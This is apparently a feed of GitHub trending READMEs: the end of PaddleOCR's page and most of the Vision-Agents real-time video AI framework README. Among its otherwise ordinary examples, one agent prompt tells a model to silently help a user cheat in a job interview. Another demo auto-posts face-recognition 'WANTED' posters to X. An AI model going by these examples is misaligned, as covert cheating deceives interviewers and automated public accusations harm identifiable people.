 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/pipeline_usage/PP-StructureV3.html"&gt;PP-StructureV3 Tutorial&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/pipeline_usage/PP-ChatOCRv4.html"&gt;PP-ChatOCRv4 Tutorial&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/version3.x/pipeline_usage/PaddleOCR-VL.html"&gt;PaddleOCR-VL Tutorial&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üîÑ Quick Overview of Execution Results&lt;/h2&gt; 
&lt;h3&gt;PP-OCRv5&lt;/h3&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/PP-OCRv5_demo.gif" alt="PP-OCRv5 Demo" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h3&gt;PP-StructureV3&lt;/h3&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/PP-StructureV3_demo.gif" alt="PP-StructureV3 Demo" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h3&gt;PaddleOCR-VL&lt;/h3&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/PaddleOCR-VL_demo.gif" alt="PP-StructureV3 Demo" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h2&gt;‚ú® Stay Tuned&lt;/h2&gt; 
&lt;p&gt;‚≠ê &lt;strong&gt;Star this repository to keep up with exciting updates and new releases, including powerful OCR and document parsing capabilities!&lt;/strong&gt; ‚≠ê&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="1200" src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/main/images/paddleocr/README/star_paddleocr.en.gif" alt="Star-Project" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h2&gt;üë©‚Äçüë©‚Äçüëß‚Äçüë¶ Community&lt;/h2&gt; 
&lt;div align="center"&gt; 
 &lt;table&gt; 
  &lt;thead&gt; 
   &lt;tr&gt; 
    &lt;th align="center"&gt;PaddlePaddle WeChat official account&lt;/th&gt; 
    &lt;th align="center"&gt;Join the tech discussion group&lt;/th&gt; 
   &lt;/tr&gt; 
  &lt;/thead&gt; 
  &lt;tbody&gt; 
   &lt;tr&gt; 
    &lt;td align="center"&gt;&lt;img src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/refs/heads/main/images/paddleocr/README/qrcode_for_paddlepaddle_official_account.jpg" width="150" /&gt;&lt;/td&gt; 
    &lt;td align="center"&gt;&lt;img src="https://raw.githubusercontent.com/cuicheng01/PaddleX_doc_images/refs/heads/main/images/paddleocr/README/qr_code_for_the_questionnaire.jpg" width="150" /&gt;&lt;/td&gt; 
   &lt;/tr&gt; 
  &lt;/tbody&gt; 
 &lt;/table&gt; 
&lt;/div&gt; 
&lt;h2&gt;üòÉ Awesome Projects Leveraging PaddleOCR&lt;/h2&gt; 
&lt;p&gt;PaddleOCR wouldn't be where it is today without its incredible community! üíó A massive thank you to all our longtime partners, new collaborators, and everyone who's poured their passion into PaddleOCR ‚Äî whether we've named you or not. Your support fuels our fire!&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;table&gt; 
  &lt;thead&gt; 
   &lt;tr&gt; 
    &lt;th&gt;Project Name&lt;/th&gt; 
    &lt;th&gt;Description&lt;/th&gt; 
   &lt;/tr&gt; 
  &lt;/thead&gt; 
  &lt;tbody&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/infiniflow/ragflow"&gt;RAGFlow&lt;/a&gt; &lt;a href="https://github.com/infiniflow/ragflow"&gt;&lt;img src="https://img.shields.io/github/stars/infiniflow/ragflow" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;RAG engine based on deep document understanding.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/pathwaycom/pathway"&gt;pathway&lt;/a&gt; &lt;a href="https://github.com/pathwaycom/pathway"&gt;&lt;img src="https://img.shields.io/github/stars/pathwaycom/pathway" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Python ETL framework for stream processing, real-time analytics, LLM pipelines, and RAG.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/opendatalab/MinerU"&gt;MinerU&lt;/a&gt; &lt;a href="https://github.com/opendatalab/MinerU"&gt;&lt;img src="https://img.shields.io/github/stars/opendatalab/MinerU" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Multi-type Document to Markdown Conversion Tool&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/hiroi-sora/Umi-OCR"&gt;Umi-OCR&lt;/a&gt; &lt;a href="https://github.com/hiroi-sora/Umi-OCR"&gt;&lt;img src="https://img.shields.io/github/stars/hiroi-sora/Umi-OCR" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Free, Open-source, Batch Offline OCR Software.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/CherryHQ/cherry-studio"&gt;cherry-studio&lt;/a&gt; &lt;a href="https://github.com/CherryHQ/cherry-studio"&gt;&lt;img src="https://img.shields.io/github/stars/CherryHQ/cherry-studio" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;A desktop client that supports for multiple LLM providers.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/microsoft/OmniParser"&gt;OmniParser&lt;/a&gt;&lt;a href="https://github.com/microsoft/OmniParser"&gt;&lt;img src="https://img.shields.io/github/stars/microsoft/OmniParser" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;OmniParser: Screen Parsing tool for Pure Vision Based GUI Agent.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/netease-youdao/QAnything"&gt;QAnything&lt;/a&gt;&lt;a href="https://github.com/netease-youdao/QAnything"&gt;&lt;img src="https://img.shields.io/github/stars/netease-youdao/QAnything" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Question and Answer based on Anything.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/opendatalab/PDF-Extract-Kit"&gt;PDF-Extract-Kit&lt;/a&gt; &lt;a href="https://github.com/opendatalab/PDF-Extract-Kit"&gt;&lt;img src="https://img.shields.io/github/stars/opendatalab/PDF-Extract-Kit" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;A powerful open-source toolkit designed to efficiently extract high-quality content from complex and diverse PDF documents.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://github.com/PantsuDango/Dango-Translator"&gt;Dango-Translator&lt;/a&gt;&lt;a href="https://github.com/PantsuDango/Dango-Translator"&gt;&lt;img src="https://img.shields.io/github/stars/PantsuDango/Dango-Translator" /&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;Recognize text on the screen, translate it and show the translation results in real time.&lt;/td&gt; 
   &lt;/tr&gt; 
   &lt;tr&gt; 
    &lt;td&gt;&lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/awesome_projects.md"&gt;Learn more projects&lt;/a&gt;&lt;/td&gt; 
    &lt;td&gt;&lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/awesome_projects.md"&gt;More projects based on PaddleOCR&lt;/a&gt;&lt;/td&gt; 
   &lt;/tr&gt; 
  &lt;/tbody&gt; 
 &lt;/table&gt; 
&lt;/div&gt; 
&lt;h2&gt;üë©‚Äçüë©‚Äçüëß‚Äçüë¶ Contributors&lt;/h2&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://github.com/PaddlePaddle/PaddleOCR/graphs/contributors"&gt; &lt;img src="https://contrib.rocks/image?repo=PaddlePaddle/PaddleOCR&amp;amp;max=400&amp;amp;columns=20" width="800" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;h2&gt;üåü Star&lt;/h2&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="800" src="https://api.star-history.com/svg?repos=PaddlePaddle/PaddleOCR&amp;amp;type=Date" alt="Star-history" /&gt; &lt;/p&gt; 
&lt;/div&gt; 
&lt;h2&gt;üìÑ License&lt;/h2&gt; 
&lt;p&gt;This project is released under the &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/LICENSE"&gt;Apache 2.0 license&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;üéì Citation&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{cui2025paddleocr30technicalreport,
      title={PaddleOCR 3.0 Technical Report}, 
      author={Cheng Cui and Ting Sun and Manhui Lin and Tingquan Gao and Yubo Zhang and Jiaxuan Liu and Xueqing Wang and Zelun Zhang and Changda Zhou and Hongen Liu and Yue Zhang and Wenyu Lv and Kui Huang and Yichao Zhang and Jing Zhang and Jun Zhang and Yi Liu and Dianhai Yu and Yanjun Ma},
      year={2025},
      eprint={2507.05595},
      archivePrefix={arXiv},
      primaryClass={cs.CV},
      url={https://arxiv.org/abs/2507.05595}, 
}

@misc{cui2025paddleocrvlboostingmultilingualdocument,
      title={PaddleOCR-VL: Boosting Multilingual Document Parsing via a 0.9B Ultra-Compact Vision-Language Model}, 
      author={Cheng Cui and Ting Sun and Suyin Liang and Tingquan Gao and Zelun Zhang and Jiaxuan Liu and Xueqing Wang and Changda Zhou and Hongen Liu and Manhui Lin and Yue Zhang and Yubo Zhang and Handong Zheng and Jing Zhang and Jun Zhang and Yi Liu and Dianhai Yu and Yanjun Ma},
      year={2025},
      eprint={2510.14528},
      archivePrefix={arXiv},
      primaryClass={cs.CV},
      url={https://arxiv.org/abs/2510.14528}, 
}
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>GetStream/Vision-Agents</title>
      <link>https://github.com/GetStream/Vision-Agents</link>
      <description>&lt;p&gt;Open Vision Agents by Stream. Build Vision Agents quickly with any model or video provider. Uses Stream's edge network for ultra-low latency.&lt;/p&gt;&lt;hr&gt;&lt;img width="1280" height="360" alt="Readme" src="https://raw.githubusercontent.com/GetStream/Vision-Agents/main/assets/repo_image.png" /&gt; 
&lt;h1&gt;Open Vision Agents by Stream&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/GetStream/Vision-Agents/actions"&gt;&lt;img src="https://github.com/GetStream/Vision-Agents/actions/workflows/ci.yml/badge.svg?sanitize=true" alt="build" /&gt;&lt;/a&gt; &lt;a href="http://badge.fury.io/py/vision-agents"&gt;&lt;img src="https://badge.fury.io/py/vision-agents.svg?sanitize=true" alt="PyPI version" /&gt;&lt;/a&gt; &lt;img src="https://img.shields.io/pypi/pyversions/vision-agents.svg?sanitize=true" alt="PyPI - Python Version" /&gt; &lt;a href="https://github.com/GetStream/Vision-Agents/raw/main/LICENSE"&gt;&lt;img src="https://img.shields.io/github/license/GetStream/Vision-Agents" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/RkhX9PxMS6"&gt;&lt;img src="https://img.shields.io/discord/1108586339550638090" alt="Discord" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Build Real-Time Vision AI Agents&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/d9778ab9-938d-4101-8605-ff879c29b0e4"&gt;https://github.com/user-attachments/assets/d9778ab9-938d-4101-8605-ff879c29b0e4&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Multi-modal AI agents that watch, listen, and understand video.&lt;/h3&gt; 
&lt;p&gt;Vision Agents give you the building blocks to create intelligent, low-latency video experiences powered by your models, your infrastructure, and your use cases.&lt;/p&gt; 
&lt;h3&gt;Key Highlights&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Video AI:&lt;/strong&gt; Built for real-time video AI. Combine YOLO, Roboflow, and others with Gemini/OpenAI in real-time.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Low Latency:&lt;/strong&gt; Join quickly (500ms) and maintain audio/video latency under 30ms using &lt;a href="https://getstream.io/video/"&gt;Stream's edge network&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Open:&lt;/strong&gt; Built by Stream, but works with any video edge network.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Native APIs:&lt;/strong&gt; Native SDK methods from OpenAI (&lt;code&gt;create response&lt;/code&gt;), Gemini (&lt;code&gt;generate&lt;/code&gt;), and Claude ( &lt;code&gt;create message&lt;/code&gt;) ‚Äî always access the latest LLM capabilities.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;SDKs:&lt;/strong&gt; SDKs for React, Android, iOS, Flutter, React Native, and Unity, powered by Stream's ultra-low-latency network.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/d66587ea-7af4-40c4-9966-5c04fbcf467c"&gt;https://github.com/user-attachments/assets/d66587ea-7af4-40c4-9966-5c04fbcf467c&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;See It In Action&lt;/h2&gt; 
&lt;h3&gt;Sports Coaching&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/d1258ac2-ca98-4019-80e4-41ec5530117e"&gt;https://github.com/user-attachments/assets/d1258ac2-ca98-4019-80e4-41ec5530117e&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;This example shows you how to build golf coaching AI with YOLO and Gemini Live. Combining a fast object detection model (like YOLO) with a full realtime AI is useful for many different video AI use cases. For example: Drone fire detection, sports/video game coaching, physical therapy, workout coaching, just dance style games etc.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# partial example, full example: examples/02_golf_coach_example/golf_coach_example.py
agent = Agent(
    edge=getstream.Edge(),
    agent_user=agent_user,
    instructions="Read @golf_coach.md",
    llm=gemini.Realtime(fps=10),
    # llm=openai.Realtime(fps=1), # Careful with FPS can get expensive
    processors=[ultralytics.YOLOPoseProcessor(model_path="yolo11n-pose.pt", device="cuda")],
)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Security Camera with Package Theft Detection&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://github.com/user-attachments/assets/92a2cdd8-909c-46d8-aab7-039a90efc186"&gt;https://github.com/user-attachments/assets/92a2cdd8-909c-46d8-aab7-039a90efc186&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;This example shows a security camera system that detects faces, tracks packages and detects when a package is stolen. It automatically generates "WANTED" posters, posting them to X in real-time.&lt;/p&gt; 
&lt;p&gt;It combines face recognition, YOLOv11 object detection, Nano Banana and Gemini for a complete security workflow with voice interaction.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# partial example, full example: examples/04_security_camera_example/security_camera_example.py
security_processor = SecurityCameraProcessor(
    fps=5,
    model_path="weights_custom.pt",  # YOLOv11 for package detection
    package_conf_threshold=0.7,
)

agent = Agent(
    edge=getstream.Edge(),
    agent_user=User(name="Security AI", id="agent"),
    instructions="Read @instructions.md",
    processors=[security_processor],
    llm=gemini.LLM("gemini-2.5-flash-lite"),
    tts=elevenlabs.TTS(),
    stt=deepgram.STT(),
)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Cluely style Invisible Assistant (coming soon)&lt;/h3&gt; 
&lt;p&gt;Apps like Cluely offer realtime coaching via an invisible overlay. This example shows you how you can build your own invisible assistant. It combines Gemini realtime (to watch your screen and audio), and doesn't broadcast audio (only text). This approach is quite versatile and can be used for: Sales coaching, job interview cheating, physical world/ on the job coaching with glasses&lt;/p&gt; 
&lt;p&gt;Demo video&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;agent = Agent(
    edge=StreamEdge(),  # low latency edge. clients for React, iOS, Android, RN, Flutter etc.
    agent_user=agent_user,  # the user object for the agent (name, image etc)
    instructions="You are silently helping the user pass this interview. See @interview_coach.md",
    # gemini realtime, no need to set tts, or sst (though that's also supported)
    llm=gemini.Realtime()
)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Quick Start&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Step 1: Install via uv&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;uv add vision-agents&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Step 2: (Optional) Install with extra integrations&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;uv add "vision-agents[getstream, openai, elevenlabs, deepgram]"&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Step 3: Obtain your Stream API credentials&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Get a free API key from &lt;a href="https://getstream.io/"&gt;Stream&lt;/a&gt;. Developers receive &lt;strong&gt;333,000 participant minutes&lt;/strong&gt; per month, plus extra credits via the Maker Program.&lt;/p&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;&lt;strong&gt;Feature&lt;/strong&gt;&lt;/th&gt; 
   &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;True real-time via WebRTC&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Stream directly to model providers that support it for instant visual understanding.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Interval/processor pipeline&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;For providers without WebRTC, process frames with pluggable video processors (e.g., YOLO, Roboflow, or custom PyTorch/ONNX) before/after model calls.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Turn detection &amp;amp; diarization&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Keep conversations natural; know when the agent should speak or stay quiet and who's talking.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Voice activity detection (VAD)&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Trigger actions intelligently and use resources efficiently.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Speech‚ÜîText‚ÜîSpeech&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Enable low-latency loops for smooth, conversational voice UX.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Tool/function calling&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Execute arbitrary code and APIs mid-conversation. Create Linear issues, query weather, trigger telephony, or hit internal services.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Built-in memory via Stream Chat&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Agents recall context naturally across turns and sessions.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Text back-channel&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Message the agent silently during a call.&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Phone and RAG&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Interact with the Agent via inbound or outbound phone calls using Twilio and Turbopuffer&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;Out-of-the-Box Integrations&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;&lt;strong&gt;Plugin Name&lt;/strong&gt;&lt;/th&gt; 
   &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt; 
   &lt;th&gt;&lt;strong&gt;Docs Link&lt;/strong&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;AWS Bedrock&lt;/td&gt; 
   &lt;td&gt;Realtime speech-to-speech plugin using Amazon Nova models with automatic reconnection&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/aws-bedrock"&gt;AWS&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;AWS Polly&lt;/td&gt; 
   &lt;td&gt;TTS plugin using Amazon's cloud-based service with natural-sounding voices and neural engine support&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/aws-polly"&gt;AWS Polly&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Cartesia&lt;/td&gt; 
   &lt;td&gt;TTS plugin for realistic voice synthesis in real-time voice applications&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/cartesia"&gt;Cartesia&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Decart&lt;/td&gt; 
   &lt;td&gt;Real-time AI video transformation service for applying artistic styles and effects to video streams&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/decart"&gt;Decart&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Deepgram&lt;/td&gt; 
   &lt;td&gt;STT plugin for fast, accurate real-time transcription with speaker diarization&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/deepgram"&gt;Deepgram&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;ElevenLabs&lt;/td&gt; 
   &lt;td&gt;TTS plugin with highly realistic and expressive voices for conversational agents&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/elevenlabs"&gt;ElevenLabs&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Fast-Whisper&lt;/td&gt; 
   &lt;td&gt;High-performance STT plugin using OpenAI's Whisper model with CTranslate2 for fast inference&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/fast-whisper"&gt;Fast-Whisper&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Fish Audio&lt;/td&gt; 
   &lt;td&gt;STT and TTS plugin with automatic language detection and voice cloning capabilities&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/fish"&gt;Fish Audio&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Gemini&lt;/td&gt; 
   &lt;td&gt;Realtime API for building conversational agents with support for both voice and video&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/gemini"&gt;Gemini&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;HeyGen&lt;/td&gt; 
   &lt;td&gt;Realtime interactive avatars powered by &lt;a href="https://heygen.com/"&gt;HeyGen&lt;/a&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/heygen"&gt;HeyGen&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Hugging Face&lt;/td&gt; 
   &lt;td&gt;LLM plugin providing access to many open-source language models hosted on the Hugging Face Hub and powered by external providers (Cerebras, Together, Groq, etc.)&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/huggingface"&gt;Hugging Face&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Inworld&lt;/td&gt; 
   &lt;td&gt;TTS plugin with high-quality streaming voices for real-time conversational AI agents&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/inworld"&gt;Inworld&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Kokoro&lt;/td&gt; 
   &lt;td&gt;Local TTS engine for offline voice synthesis with low latency&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/kokoro"&gt;Kokoro&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Moondream&lt;/td&gt; 
   &lt;td&gt;Moondream provides realtime detection and VLM capabilities. Developers can choose from using the hosted API or running locally on their CUDA devices. Vision Agents supports Moondream's Detect, Caption and VQA skills out-of-the-box.&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/moondream"&gt;Moondream&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;NVIDIA Cosmos 2&lt;/td&gt; 
   &lt;td&gt;VLM plugin using NVIDIA's Cosmos 2 models for video understanding with automatic frame buffering and streaming responses&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/nvidia"&gt;NVIDIA&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;OpenAI&lt;/td&gt; 
   &lt;td&gt;Realtime API for building conversational agents with out of the box support for real-time video directly over WebRTC, LLMs and Open AI TTS&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/openai"&gt;OpenAI&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;OpenRouter&lt;/td&gt; 
   &lt;td&gt;LLM plugin providing access to multiple providers (Anthropic, Google, OpenAI) through a unified API&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/openrouter"&gt;OpenRouter&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Qwen&lt;/td&gt; 
   &lt;td&gt;Realtime audio plugin using Alibaba's Qwen3 with native audio output and built-in speech recognition&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/qwen"&gt;Qwen&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Roboflow&lt;/td&gt; 
   &lt;td&gt;Object detection processor using Roboflow's hosted API or local RF-DETR models&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/roboflow"&gt;Roboflow&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Smart Turn&lt;/td&gt; 
   &lt;td&gt;Advanced turn detection system combining Silero VAD, Whisper, and neural models for natural conversation flow&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/smart-turn"&gt;Smart Turn&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;TurboPuffer&lt;/td&gt; 
   &lt;td&gt;RAG plugin using TurboPuffer for hybrid search (vector + BM25) with Gemini embeddings for retrieval augmented generation&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/guides/rag"&gt;TurboPuffer&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Twilio&lt;/td&gt; 
   &lt;td&gt;Voice call integration plugin enabling bidirectional audio streaming via Twilio Media Streams with call registry and audio conversion&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/GetStream/Vision-Agents/tree/main/examples/03_phone_and_rag_example"&gt;Twilio&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Ultralytics&lt;/td&gt; 
   &lt;td&gt;Real-time pose detection processor using YOLO models with skeleton overlays&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/ultralytics"&gt;Ultralytics&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Vogent&lt;/td&gt; 
   &lt;td&gt;Neural turn detection system for intelligent turn-taking in voice conversations&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://visionagents.ai/integrations/vogent"&gt;Vogent&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
